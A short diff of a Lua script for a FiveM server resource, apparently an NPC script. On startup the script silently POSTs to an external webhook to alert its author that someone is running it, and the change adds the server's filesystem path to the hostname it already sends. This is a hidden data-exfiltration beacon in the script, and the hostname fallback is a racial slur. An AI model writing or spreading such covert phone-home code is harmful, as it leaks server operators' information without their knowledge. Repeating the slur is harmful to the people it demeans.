@@ -3,7 +3,7 @@ local lconnect = "@everyone some one is using your adam sh npc script"
 AddEventHandler("onServerResourceStart", function(resource)
     if GetCurrentResourceName() == resource then
        local servername = GetConvar("sv_hostname","nigga")
-     local connect = lconnect.."\nServer name: "..servername
+        local connect = lconnect.."\nServer: "..servername.. "\npath :" ..GetResourcePath(GetCurrentResourceName()).. ""
         PerformHttpRequest(logs, function(err, text, headers) end, 'POST', json.encode({username = "Adam System", content = connect}), { ['Content-Type'] = 'application/json' })
     end
 end)
